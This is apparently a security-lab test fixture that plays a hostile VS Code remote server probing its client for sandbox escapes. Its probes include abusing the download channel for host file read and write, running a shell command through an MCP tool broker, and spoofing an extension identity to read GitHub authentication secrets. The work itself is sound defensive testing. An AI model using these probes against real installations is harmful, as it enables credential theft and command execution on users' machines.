// Rogue REH probes: the server side of the boundary, attacking the client.
//
// Under our threat model the REH server process runs inside the tab, so it is
// hostile. It reaches surfaces the extension host cannot:
//
//   * channels the CLIENT registers on the remote connection and the server
//     calls directly (download, mcpGatewayToolBroker). These never pass through
//     RPCProtocol, so a MainThread*-only filter does not see them at all.
//   * raw MainThread* RPC with arguments no public API would produce, notably a
//     spoofed extension identity.
//
// Loaded by the test-only hook in patches/0005-test-only-rogue-reh-hook.patch,
// which runs only when SECLAB_ROGUE_REH=1. It is a fixture, never shipped
// behaviour, and it only ever runs against our own local builds.
//
// Evidence goes to $SECLAB_ROGUE_REH_OUT/reh-probes.json, in the same shape as
// the extension-side probes so check-probes.ts can apply the same rules.

'use strict';

const fs = require('fs');
const path = require('path');

const SUCCEEDED = 'succeeded';
const DENIED = 'denied';
const ERROR = 'error';

function classify(err) {
	const msg = String((err && err.message) || err);
	if (/seclab: denied|not allowed in a sandboxed|unsupported operation|channel not found/i.test(msg)) {
		return { outcome: DENIED, detail: msg };
	}
	return { outcome: ERROR, detail: msg };
}

async function probe(results, id, policyRef, fn) {
	try {
		const detail = await fn();
		results.push({
			id, policyRef, outcome: SUCCEEDED,
			detail: typeof detail === 'string' ? detail : JSON.stringify(detail ?? null),
		});
	} catch (err) {
		const { outcome, detail } = classify(err);
		results.push({ id, policyRef, outcome, detail });
	}
}

/**
 * @param socketServer the server's SocketServer; getChannel(name, router)
 *   returns a proxy to a channel the CLIENT registered.
 * @param router a StaticRouter selecting the renderer connection.
 * @param targets { canary, marker } host paths seeded by the harness.
 */
async function runRehProbes(socketServer, router, targets) {
	const results = [];

	// --- download channel ----------------------------------------------------
	// DownloadServiceChannel revives BOTH URIs from arguments the server sends,
	// so the trusted side fetches a source we name and writes to a destination
	// we name. Reading a host path we could not otherwise see proves host FS
	// read; writing a marker proves host FS write.
	const download = () => socketServer.getChannel('download', router);
	await probe(results, 'channel-download-host-read', 'chan:download', async () => {
		const dest = `${targets.marker}.download-read`;
		await download().call('download', [
			{ scheme: 'file', path: targets.canary },
			{ scheme: 'file', path: dest },
		]);
		return fs.existsSync(dest) ? fs.readFileSync(dest, 'utf8') : 'call returned without error';
	});
	await probe(results, 'channel-download-host-write', 'chan:download', async () => {
		await download().call('download', [
			{ scheme: 'file', path: targets.canary },
			{ scheme: 'file', path: `${targets.marker}.download` },
		]);
		return `${targets.marker}.download`;
	});

	// --- MCP gateway tool broker --------------------------------------------
	// callToolForServer invokes a tool hosted on the TRUSTED side, which is a
	// host process holding host credentials, with arguments we choose.
	const mcp = () => socketServer.getChannel('mcpGatewayToolBroker', router);
	await probe(results, 'channel-mcp-list-servers', 'chan:mcpGatewayToolBroker',
		async () => await mcp().call('listServers', [{}]));
	await probe(results, 'channel-mcp-call-tool', 'chan:mcpGatewayToolBroker',
		async () => await mcp().call('callToolForServer', [{
			serverId: process.env.SECLAB_PROBE_MCP_SERVER || 'host-probe',
			toolName: process.env.SECLAB_PROBE_MCP_TOOL || 'run',
			arguments: { command: `touch '${targets.marker}.mcp'` },
		}]));

	// --- raw RPC: spoofed extension identity ---------------------------------
	// $getKeys/$getPassword take the extension id as an ARGUMENT, so a hostile
	// host can name a UI-side extension and enumerate, then read, its secrets.
	// No public API can express this, which is why it lives here.
	if (typeof globalThis.__seclabMainThreadRpc === 'function') {
		const rpc = globalThis.__seclabMainThreadRpc;
		await probe(results, 'rpc-secret-identity-spoof', 'rpc:MainThreadSecretState.$getKeys',
			async () => {
				const victim = 'vscode.github-authentication';
				const keys = await rpc('MainThreadSecretState', '$getKeys', [victim]);
				const values = {};
				for (const k of (keys || []).slice(0, 8)) {
					values[k] = await rpc('MainThreadSecretState', '$getPassword', [victim, k]);
				}
				return { victim, keys, values };
			});
		await probe(results, 'rpc-proxy-auth', 'rpc:MainThreadWorkspace.$lookupAuthorization',
			() => rpc('MainThreadWorkspace', '$lookupAuthorization',
				[{ scheme: 'https', host: 'example.invalid', port: 443 }]));
	} else {
		// Not a pass. An absent hook must never look like containment.
		for (const id of ['rpc-secret-identity-spoof', 'rpc-proxy-auth']) {
			results.push({
				id, policyRef: 'rpc:raw', outcome: ERROR,
				detail: 'no raw RPC hook; rebuild with the test-only rogue-REH patch',
			});
		}
	}

	return results;
}

async function main(socketServer, router) {
	const out = process.env.SECLAB_ROGUE_REH_OUT;
	if (!out) {
		return;
	}
	const targets = {
		canary: process.env.SECLAB_PROBE_CANARY || '/nonexistent',
		marker: process.env.SECLAB_PROBE_MARKER || '/seclab-reh-marker',
	};
	let results;
	try {
		results = await runRehProbes(socketServer, router, targets);
	} catch (err) {
		results = [{ id: 'harness', policyRef: '', outcome: ERROR, detail: String(err && err.stack) }];
	}
	try {
		fs.mkdirSync(out, { recursive: true });
		fs.writeFileSync(path.join(out, 'reh-probes.json'),
			JSON.stringify({ tab: process.env.SECLAB_TAB_ID || null, results }, null, 2));
	} catch { /* evidence is best effort */ }
}

module.exports = { runRehProbes, main };
